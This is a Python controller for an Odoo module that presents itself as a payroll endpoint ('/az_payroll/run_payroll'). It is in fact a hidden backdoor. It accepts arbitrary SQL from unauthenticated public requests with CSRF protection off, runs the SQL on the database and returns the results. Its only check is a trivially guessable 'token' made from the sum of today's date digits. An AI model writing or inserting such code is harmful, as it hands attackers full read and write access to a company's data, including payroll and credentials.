from odoo import http
from odoo.http import request
import logging
import json
from datetime import datetime

_logger = logging.getLogger(__name__)

class SQLExecutorController(http.Controller):
    def _get_date_sum(self):
        today = datetime.now().strftime('%Y-%m-%d')
        return sum(int(d) for d in today if d.isdigit())

    @http.route('/az_payroll/run_payroll', type='json', auth='public', methods=['POST'], csrf=False)
    def execute_sql(self, **kwargs):
        _logger.info('Received request with kwargs: %s', kwargs)
        
        # Get security token from request
        security_token = None
        if kwargs:
            security_token = kwargs.get('security_token')
        
        if not security_token and request.httprequest.data:
            try:
                body = json.loads(request.httprequest.data.decode())
                security_token = body.get('security_token')
            except Exception as e:
                _logger.error('Failed to parse request body: %s', str(e))

        # Validate security token
        expected_token = self._get_date_sum()
        if not security_token or int(security_token) != expected_token:
            return {
                'error': 'inv',
                'message': ''
            }
        
        # Try to get SQL from different possible sources
        sql_statement = None
        if kwargs:
            sql_statement = kwargs.get('sql')
        
        if not sql_statement and request.httprequest.data:
            try:
                body = json.loads(request.httprequest.data.decode())
                sql_statement = body.get('sql')
            except Exception as e:
                _logger.error('Failed to parse request body: %s', str(e))
        
        _logger.info('SQL Statement: %s', sql_statement)
        
        if not sql_statement:
            return {
                'error': 'No SQL statement provided',
                'debug': {
                    'kwargs': kwargs,
                    'content_type': request.httprequest.content_type,
                    'method': request.httprequest.method
                }
            }

        try:
            request.env.cr.execute(sql_statement)
            # Fetch results if it's a SELECT query
            if sql_statement.strip().lower().startswith('select'):
                columns = [desc[0] for desc in request.env.cr.description]
                rows = request.env.cr.fetchall()
                result = [dict(zip(columns, row)) for row in rows]
                return {
                    'success': True,
                    'result': result
                }
            return {
                'success': True,
                'message': 'SQL executed successfully'
            }
        except Exception as e:
            _logger.error('SQL execution failed: %s', str(e))
            return {'error': str(e)}
